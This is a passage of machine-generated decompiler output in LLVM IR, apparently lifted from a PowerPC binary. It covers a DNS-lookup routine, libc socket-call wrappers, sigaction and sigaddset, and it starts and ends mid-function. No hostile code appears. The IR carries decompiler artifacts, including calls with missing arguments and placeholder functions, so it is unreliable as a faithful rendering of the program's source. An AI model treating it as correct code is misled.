  %v0_1000bce0 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000bce0 = load i32, i32* @r26, align 4
  %v2_1000bce0 = add i32 %v1_1000bce0, 16
  %v3_1000bce0 = inttoptr i32 %v2_1000bce0 to i32*
  store i32 %v0_1000bce0, i32* %v3_1000bce0, align 4
  %v0_1000bce4 = load i32, i32* @r21, align 4
  %v1_1000bce4 = load i32, i32* @r26, align 4
  %v2_1000bce4 = add i32 %v1_1000bce4, 4
  %v3_1000bce4 = inttoptr i32 %v2_1000bce4 to i32*
  store i32 %v0_1000bce4, i32* %v3_1000bce4, align 4
  %v0_1000bce8 = load i32, i32* @r26, align 4
  %v1_1000bce8 = load i32, i32* @r20, align 4
  %v2_1000bce8 = inttoptr i32 %v1_1000bce8 to i32*
  store i32 %v0_1000bce8, i32* %v2_1000bce8, align 4
  %v0_1000bcec = load i32, i32* %r28.global-to-local, align 4
  %v1_1000bcec = load i32, i32* @r24, align 4
  %v2_1000bcec = inttoptr i32 %v1_1000bcec to i32*
  store i32 %v0_1000bcec, i32* %v2_1000bcec, align 4
  br label %dec_label_pc_1000bec8

dec_label_pc_1000bcf4:                            ; preds = %dec_label_pc_1000bc94
  store i32 268483836, i32* @lr, align 4
  %v0_1000bcf8 = call i32 @__open_nameservers()
  %v2_1000bd00 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000bd00, i32* %r28.global-to-local, align 4
  store i32 %v2_1000bd00, i32* %r3.global-to-local, align 4
  %v4_1000bd14 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 268461856, i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 ptrtoint (i32* @global_var_1002c210.317 to i32), i32* %r3.global-to-local, align 4
  store i32 268483872, i32* @lr, align 4
  %v1_1000bd1c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  %v3_1000bd24 = load i32, i32* @global_var_1002c3c8.318, align 4
  store i32 %v3_1000bd24, i32* @r29, align 4
  store i32 %v2_1000bd00, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268483892, i32* @lr, align 4
  %v0_1000bd30 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000bd38 = load i32, i32* @r23, align 4
  store i32 %v0_1000bd38, i32* %r3.global-to-local, align 4
  %v0_1000bd3c = load i32, i32* @r29, align 4
  %v2_1000bd48 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000bd4c = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000bd50 = load i32, i32* @r22, align 4
  store i32 268483936, i32* @lr, align 4
  %v6_1000bd5c = inttoptr i32 %v0_1000bd38 to i8*
  %v7_1000bd5c = call i32 @__dns_lookup(i8* %v6_1000bd5c, i32 1, i32 %v0_1000bd3c, i32 ptrtoint (i32* @global_var_10030d3c.319 to i32), i32 %v2_1000bd48, i32 %v2_1000bd4c)
  store i32 %v7_1000bd5c, i32* %r3.global-to-local, align 4
  %v1_1000bd60 = icmp slt i32 %v7_1000bd5c, 0
  br i1 %v1_1000bd60, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bd68

dec_label_pc_1000bd68:                            ; preds = %dec_label_pc_1000bcf4
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000bd70 = add i32 %tmp19, 4
  %v2_1000bd74 = mul i32 %v0_1000bd50, %v1_1000bd70
  %v1_1000bd78 = add i32 %v2_1000bd74, 256
  %v1_1000bd7c = load i32, i32* @r27, align 4
  %v3_1000bd7c = icmp ugt i32 %v1_1000bd78, %v1_1000bd7c
  br i1 %v3_1000bd7c, label %dec_label_pc_1000bd84, label %dec_label_pc_1000bda0

dec_label_pc_1000bd84:                            ; preds = %dec_label_pc_1000bd68
  %v3_1000bd84 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000bd84, i32* @r3, align 4
  store i32 268483980, i32* @lr, align 4
  %v0_1000bd88 = call i32 @free()
  %v3_1000bd8c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000bd8c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bd94.320 to i32), i32* @lr, align 4
  %v0_1000bd90 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000bd98 = load i32, i32* @r19, align 4
  %v1_1000bd98 = load i32, i32* @r24, align 4
  %v2_1000bd98 = inttoptr i32 %v1_1000bd98 to i32*
  store i32 %v0_1000bd98, i32* %v2_1000bd98, align 4
  br label %dec_label_pc_1000bec8

dec_label_pc_1000bda0:                            ; preds = %dec_label_pc_1000bd68
  %v3_1000bda0 = icmp eq i32 %v0_1000bd50, 0
  br i1 %v3_1000bda0, label %dec_label_pc_1000bda0.dec_label_pc_1000be44_crit_edge, label %dec_label_pc_1000bda8

dec_label_pc_1000bda0.dec_label_pc_1000be44_crit_edge: ; preds = %dec_label_pc_1000bda0
  %v0_1000be4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000be44

dec_label_pc_1000bda8:                            ; preds = %dec_label_pc_1000bda0
  %v2_1000bda8 = mul i32 %v0_1000bd50, %tmp19
  store i32 %v2_1000bda8, i32* @r5, align 4
  %v0_1000bdac = load i32, i32* @r30, align 4
  %v1_1000bdac = add i32 %v0_1000bdac, 36
  store i32 %v1_1000bdac, i32* %r3.global-to-local, align 4
  %v0_1000bdb0 = load i32, i32* @r31, align 4
  store i32 268484024, i32* @lr, align 4
  %v2_1000bdb4 = call i32 @memmove(i32 %v1_1000bdac, i32 %v0_1000bdb0)
  store i32 %v2_1000bdb4, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bda8, i32* %r0.global-to-local, align 4
  %v0_1000bdc4 = load i32, i32* @r30, align 4
  %v1_1000bdc4 = load i32, i32* @r31, align 4
  %v3_1000bdc4 = add i32 %v1_1000bdc4, %v2_1000bda8
  %v4_1000bdc4 = inttoptr i32 %v3_1000bdc4 to i32*
  store i32 %v0_1000bdc4, i32* %v4_1000bdc4, align 4
  %v0_1000bdc8 = load i32, i32* @r31, align 4
  %v1_1000bdc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000bdc8 = add i32 %v1_1000bdc8, %v0_1000bdc8
  store i32 %v2_1000bdc8, i32* @r25, align 4
  %v1_1000bdd0 = add i32 %v0_1000bd50, -1
  store i32 %v1_1000bdd0, i32* %r11.global-to-local, align 4
  %v1_1000bdd4 = add i32 %v0_1000bd50, 1
  %v2_1000bdd8 = icmp sgt i32 %v1_1000bdd0, -1
  store i32 %v1_1000bdd4, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000bdd8, label %dec_label_pc_1000be08.preheader, label %dec_label_pc_1000bde4

dec_label_pc_1000bde4:                            ; preds = %dec_label_pc_1000bda8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000be08.preheader

dec_label_pc_1000be08.preheader:                  ; preds = %dec_label_pc_1000bde4, %dec_label_pc_1000bda8
  %v0_1000be106 = phi i32 [ 1, %dec_label_pc_1000bde4 ], [ %v1_1000bdd4, %dec_label_pc_1000bda8 ]
  %v1_1000be083 = mul i32 %v1_1000bdd0, 4
  store i32 %v1_1000be083, i32* %r0.global-to-local, align 4
  %v2_1000be0c5 = add i32 %v2_1000bdc8, %v1_1000be083
  store i32 %v2_1000be0c5, i32* @r10, align 4
  %v1_1000be107 = add i32 %v0_1000be106, -1
  store i32 %v1_1000be107, i32* %ctr.global-to-local, align 4
  %v2_1000be108 = icmp eq i32 %v1_1000be107, 0
  br i1 %v2_1000be108, label %dec_label_pc_1000be14, label %dec_label_pc_1000bdf0

dec_label_pc_1000bdf0:                            ; preds = %dec_label_pc_1000be08.preheader, %dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge
  %v1_1000be04 = phi i32 [ %v2_1000be0c, %dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge ], [ %v2_1000be0c5, %dec_label_pc_1000be08.preheader ]
  %v0_1000bdfc = phi i32 [ %v0_1000bdfc.pre, %dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge ], [ %v0_1000bdc8, %dec_label_pc_1000be08.preheader ]
  %v0_1000bdf4 = phi i32 [ %v0_1000be08, %dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge ], [ %v1_1000bdd0, %dec_label_pc_1000be08.preheader ]
  %v2_1000bdf4 = mul i32 %v0_1000bdf4, %tmp19
  %v1_1000bdf8 = add i32 %v0_1000bdf4, -1
  store i32 %v1_1000bdf8, i32* %r11.global-to-local, align 4
  %v2_1000bdfc = add i32 %v0_1000bdfc, -8
  %v1_1000be00 = add i32 %v2_1000bdfc, %v2_1000bdf4
  %v2_1000be04 = add i32 %v1_1000be04, 4
  %v3_1000be04 = inttoptr i32 %v2_1000be04 to i32*
  store i32 %v1_1000be00, i32* %v3_1000be04, align 4
  %v0_1000be08 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000be08 = mul i32 %v0_1000be08, 4
  store i32 %v1_1000be08, i32* %r0.global-to-local, align 4
  %v1_1000be0c = load i32, i32* @r25, align 4
  %v2_1000be0c = add i32 %v1_1000be0c, %v1_1000be08
  store i32 %v2_1000be0c, i32* @r10, align 4
  %v0_1000be10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000be10 = add i32 %v0_1000be10, -1
  store i32 %v1_1000be10, i32* %ctr.global-to-local, align 4
  %v2_1000be10 = icmp eq i32 %v1_1000be10, 0
  br i1 %v2_1000be10, label %dec_label_pc_1000be14, label %dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge

dec_label_pc_1000bdf0.dec_label_pc_1000bdf0_crit_edge: ; preds = %dec_label_pc_1000bdf0
  %v0_1000bdfc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bdf0

dec_label_pc_1000be14:                            ; preds = %dec_label_pc_1000bdf0, %dec_label_pc_1000be08.preheader
  %v1_1000be20 = phi i32 [ %v2_1000bdc8, %dec_label_pc_1000be08.preheader ], [ %v1_1000be0c, %dec_label_pc_1000bdf0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000be1c = mul i32 %v0_1000bd50, 4
  %v2_1000be20 = add i32 %v1_1000be1c, 4
  %v2_1000be24 = add i32 %v2_1000be20, %v1_1000be20
  %v3_1000be24 = inttoptr i32 %v2_1000be24 to i32*
  store i32 0, i32* %v3_1000be24, align 4
  %v0_1000be30 = load i32, i32* @r25, align 4
  %v2_1000be30 = add i32 %v0_1000be30, %v1_1000be1c
  store i32 %v2_1000be30, i32* %r11.global-to-local, align 4
  %v1_1000be34 = load i32, i32* @r31, align 4
  %v2_1000be34 = sub i32 %v1_1000be34, %v2_1000be30
  %v1_1000be38 = add i32 %v2_1000be30, 8
  store i32 %v1_1000be38, i32* @r31, align 4
  %v0_1000be3c = load i32, i32* @r27, align 4
  %v2_1000be3c = add i32 %v0_1000be3c, %v2_1000be34
  %v1_1000be40 = add i32 %v2_1000be3c, -8
  br label %dec_label_pc_1000be44

dec_label_pc_1000be44:                            ; preds = %dec_label_pc_1000bda0.dec_label_pc_1000be44_crit_edge, %dec_label_pc_1000be14
  %v0_1000be4c = phi i32 [ %v0_1000be4c.pre, %dec_label_pc_1000bda0.dec_label_pc_1000be44_crit_edge ], [ %v1_1000be38, %dec_label_pc_1000be14 ]
  %v0_1000be48 = phi i32 [ %v1_1000bd7c, %dec_label_pc_1000bda0.dec_label_pc_1000be44_crit_edge ], [ %v1_1000be40, %dec_label_pc_1000be14 ]
  %v3_1000be44 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000be44, i32* @r4, align 4
  store i32 %v0_1000be4c, i32* %r3.global-to-local, align 4
  store i32 268484180, i32* @lr, align 4
  %v3_1000be50 = call i32 @strncpy(i32 %v0_1000be4c, i32 %v3_1000be44, i32 %v0_1000be48)
  %v3_1000be54 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000be54, i32* @r3, align 4
  store i32 268484188, i32* @lr, align 4
  %v0_1000be58 = call i32 @free()
  store i32 %v0_1000be58, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000be60 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000be60, label %dec_label_pc_1000be68, label %dec_label_pc_1000beb0

dec_label_pc_1000be68:                            ; preds = %dec_label_pc_1000be44
  store i32 4, i32* @r5, align 4
  %v0_1000be70 = load i32, i32* @r30, align 4
  store i32 %v0_1000be70, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000be78.321 to i32), i32* @lr, align 4
  %v0_1000be74 = call i32 @memcpy()
  %v1_1000be7c = load i32, i32* @r26, align 4
  %v2_1000be7c = add i32 %v1_1000be7c, 8
  %v3_1000be7c = inttoptr i32 %v2_1000be7c to i32*
  store i32 2, i32* %v3_1000be7c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000be84 = load i32, i32* @r26, align 4
  %v2_1000be84 = add i32 %v1_1000be84, 12
  %v3_1000be84 = inttoptr i32 %v2_1000be84 to i32*
  store i32 4, i32* %v3_1000be84, align 4
  %v0_1000be88 = load i32, i32* @r31, align 4
  %v1_1000be88 = load i32, i32* @r26, align 4
  %v2_1000be88 = inttoptr i32 %v1_1000be88 to i32*
  store i32 %v0_1000be88, i32* %v2_1000be88, align 4
  %v0_1000be8c = load i32, i32* @r25, align 4
  %v1_1000be8c = load i32, i32* @r26, align 4
  %v2_1000be8c = add i32 %v1_1000be8c, 16
  %v3_1000be8c = inttoptr i32 %v2_1000be8c to i32*
  store i32 %v0_1000be8c, i32* %v3_1000be8c, align 4
  %v0_1000be90 = load i32, i32* @r21, align 4
  %v1_1000be90 = load i32, i32* @r26, align 4
  %v2_1000be90 = add i32 %v1_1000be90, 4
  %v3_1000be90 = inttoptr i32 %v2_1000be90 to i32*
  store i32 %v0_1000be90, i32* %v3_1000be90, align 4
  %v3_1000be94 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000be94, i32* @r3, align 4
  store i32 268484252, i32* @lr, align 4
  %v0_1000be98 = call i32 @free()
  store i32 %v0_1000be98, i32* %r3.global-to-local, align 4
  %v0_1000be9c = load i32, i32* @r26, align 4
  %v1_1000be9c = load i32, i32* @r20, align 4
  %v2_1000be9c = inttoptr i32 %v1_1000be9c to i32*
  store i32 %v0_1000be9c, i32* %v2_1000be9c, align 4
  br label %dec_label_pc_1000bea8

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000beb0, %dec_label_pc_1000bcf4, %dec_label_pc_1000be68
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000be68 ], [ 2, %dec_label_pc_1000bcf4 ], [ 2, %dec_label_pc_1000beb0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000be68 ], [ 1, %dec_label_pc_1000bcf4 ], [ 1, %dec_label_pc_1000beb0 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000bea8 = load i32, i32* @r24, align 4
  %v2_1000bea8 = inttoptr i32 %v1_1000bea8 to i32*
  store i32 %storemerge, i32* %v2_1000bea8, align 4
  br label %dec_label_pc_1000bec8

dec_label_pc_1000beb0:                            ; preds = %dec_label_pc_1000be44
  %v3_1000beb0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000beb0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000beb8.322 to i32), i32* @lr, align 4
  %v0_1000beb4 = call i32 @free()
  store i32 %v0_1000beb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bea8

dec_label_pc_1000bec4:                            ; preds = %dec_label_pc_1000bc88, %dec_label_pc_1000bc6c, %dec_label_pc_1000bc60, %dec_label_pc_1000bc50, %dec_label_pc_1000bc40
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bec8

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000bc24, %dec_label_pc_1000bc1c, %dec_label_pc_1000bbd0, %entry, %dec_label_pc_1000bea8, %dec_label_pc_1000bd84, %dec_label_pc_1000bcc8, %dec_label_pc_1000bec4
  store i32 %v0_1000bb9c, i32* %r0.global-to-local, align 4
  %v0_1000bed8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bed8

; uselistorder directives
  uselistorder i32 %v0_1000be4c, { 1, 0 }
  uselistorder i32 %v1_1000be1c, { 1, 0 }
  uselistorder i32 %v1_1000be10, { 1, 0 }
  uselistorder i32 %v2_1000be0c, { 1, 0 }
  uselistorder i32 %v1_1000be08, { 1, 0 }
  uselistorder i32 %v0_1000bdf4, { 1, 0 }
  uselistorder i32 %v1_1000be083, { 1, 0 }
  uselistorder i32 %v1_1000bdd0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000bdc8, { 1, 0, 2 }
  uselistorder i32 %v0_1000bd50, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000bc94, { 1, 0, 2 }
  uselistorder i32 %v0_1000bc50.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000bc38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 5, 6, 7, 3, 2, 8, 4, 9, 10, 11, 12, 14, 13, 15, 1, 16, 17, 22, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000bec8, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000bea8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000be44, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc50, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bef0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484352, i32* @lr, align 4
  %v2_1000befc = call i32 @__socketcall(i32 5, i32 %v2_1000bef0)
  ret i32 %v2_1000befc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_1000bf18 = load i32, i32* @r3, align 4
  store i32 %v0_1000bf18, i32* %stack_var_-24, align 4
  %v2_1000bf24 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484404, i32* @lr, align 4
  %v2_1000bf30 = call i32 @__socketcall(i32 2, i32 %v2_1000bf24)
  ret i32 %v2_1000bf30

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bf58 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484456, i32* @lr, align 4
  %v2_1000bf64 = call i32 @__socketcall(i32 3, i32 %v2_1000bf58)
  ret i32 %v2_1000bf64

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bf8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484504, i32* @lr, align 4
  %v2_1000bf94 = call i32 @__socketcall(i32 4, i32 %v2_1000bf8c)
  ret i32 %v2_1000bf94

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bfbc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484560, i32* @lr, align 4
  %v2_1000bfcc = call i32 @__socketcall(i32 10, i32 %v2_1000bfbc)
  ret i32 %v2_1000bfcc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000bff4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484624, i32* @lr, align 4
  %v2_1000c00c = call i32 @__socketcall(i32 12, i32 %v2_1000bff4)
  ret i32 %v2_1000c00c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c034 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484676, i32* @lr, align 4
  %v2_1000c040 = call i32 @__socketcall(i32 17, i32 %v2_1000c034)
  ret i32 %v2_1000c040

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c068 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484732, i32* @lr, align 4
  %v2_1000c078 = call i32 @__socketcall(i32 9, i32 %v2_1000c068)
  ret i32 %v2_1000c078

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c0a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484784, i32* @lr, align 4
  %v2_1000c0ac = call i32 @__socketcall(i32 16, i32 %v2_1000c0a0)
  ret i32 %v2_1000c0ac

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c0d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484848, i32* @lr, align 4
  %v2_1000c0ec = call i32 @__socketcall(i32 11, i32 %v2_1000c0d4)
  ret i32 %v2_1000c0ec

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000c114 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268484908, i32* @lr, align 4
  %v2_1000c128 = call i32 @__socketcall(i32 14, i32 %v2_1000c114)
  ret i32 %v2_1000c128

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000c150 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484960, i32* @lr, align 4
  %v2_1000c15c = call i32 @__socketcall(i32 1, i32 %v2_1000c150)
  ret i32 %v2_1000c15c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 8, 11, 4, 10, 9, 5, 7, 3, 2, 6 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000c174 = load i32, i32* @lr, align 4
  store i32 %v0_1000c174, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000c180 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000c190 = add i32 %tmp, 4
  store i32 %v1_1000c190, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000c198 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000c198, i32* @r3, align 4
  br i1 %v3_1000c180, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c1a0

dec_label_pc_1000c1a0:                            ; preds = %entry
  %v2_1000c1a0 = load i32, i32* %arg2, align 4
  store i32 %v2_1000c1a0, i32* %r0.global-to-local, align 4
  store i32 268485036, i32* @lr, align 4
  %v0_1000c1a8 = call i32 @memcpy()
  %v0_1000c1ac = load i32, i32* @r31, align 4
  %v1_1000c1ac = add i32 %v0_1000c1ac, 132
  %v2_1000c1ac = inttoptr i32 %v1_1000c1ac to i32*
  %v3_1000c1ac = load i32, i32* %v2_1000c1ac, align 4
  store i32 %v3_1000c1ac, i32* %r0.global-to-local, align 4
  %v1_1000c1b8 = add i32 %v0_1000c1ac, 136
  %v2_1000c1b8 = inttoptr i32 %v1_1000c1b8 to i32*
  %v3_1000c1b8 = load i32, i32* %v2_1000c1b8, align 4
  store i32 %v3_1000c1b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000c1c0

dec_label_pc_1000c1c0:                            ; preds = %entry, %dec_label_pc_1000c1a0
  store i32 268485088, i32* @lr, align 4
  %v0_1000c1dc = call i32 @__syscall_rt_sigaction()
  %v0_1000c1e0 = load i32, i32* @r30, align 4
  %v3_1000c1e0 = icmp eq i32 %v0_1000c1e0, 0
  store i32 %v0_1000c1dc, i32* @r31, align 4
  br i1 %v3_1000c1e0, label %dec_label_pc_1000c21c, label %dec_label_pc_1000c1f0

dec_label_pc_1000c1f0:                            ; preds = %dec_label_pc_1000c1c0
  %v1_1000c1e8 = icmp slt i32 %v0_1000c1dc, 0
  %v1_1000c1f0 = add i32 %v0_1000c1e0, 4
  store i32 %v1_1000c1f0, i32* @r3, align 4
  %v2_1000c1f4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000c1f4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000c1e8, label %dec_label_pc_1000c21c, label %dec_label_pc_1000c200

dec_label_pc_1000c200:                            ; preds = %dec_label_pc_1000c1f0
  %v3_1000c200 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000c200, i32* %r0.global-to-local, align 4
  %v2_1000c204 = inttoptr i32 %v0_1000c1e0 to i32*
  store i32 %v3_1000c200, i32* %v2_1000c204, align 4
  store i32 268485132, i32* @lr, align 4
  %v0_1000c208 = call i32 @memcpy()
  store i32 %tmp6, i32* @r9, align 4
  %v1_1000c214 = load i32, i32* @r30, align 4
  %v2_1000c214 = add i32 %v1_1000c214, 136
  %v3_1000c214 = inttoptr i32 %v2_1000c214 to i32*
  store i32 %tmp6, i32* %v3_1000c214, align 4
  %v0_1000c218 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c218 = load i32, i32* @r30, align 4
  %v2_1000c218 = add i32 %v1_1000c218, 132
  %v3_1000c218 = inttoptr i32 %v2_1000c218 to i32*
  store i32 %v0_1000c218, i32* %v3_1000c218, align 4
  %v0_1000c220.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c21c

dec_label_pc_1000c21c:                            ; preds = %dec_label_pc_1000c1f0, %dec_label_pc_1000c1c0, %dec_label_pc_1000c200
  %v0_1000c220 = phi i32 [ %v0_1000c1dc, %dec_label_pc_1000c1f0 ], [ %v0_1000c1dc, %dec_label_pc_1000c1c0 ], [ %v0_1000c220.pre, %dec_label_pc_1000c200 ]
  store i32 %v0_1000c174, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c220

; uselistorder directives
  uselistorder i32 %v0_1000c1dc, { 0, 1, 3, 2 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder label %dec_label_pc_1000c21c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c1c0, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000c264, label %dec_label_pc_1000c250

dec_label_pc_1000c250:                            ; preds = %entry
  %v0_1000c250 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c25c = inttoptr i32 %v0_1000c250 to i32*
  store i32 22, i32* %v2_1000c25c, align 4
  %v0_1000c270.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c26c

dec_label_pc_1000c264:                            ; preds = %entry
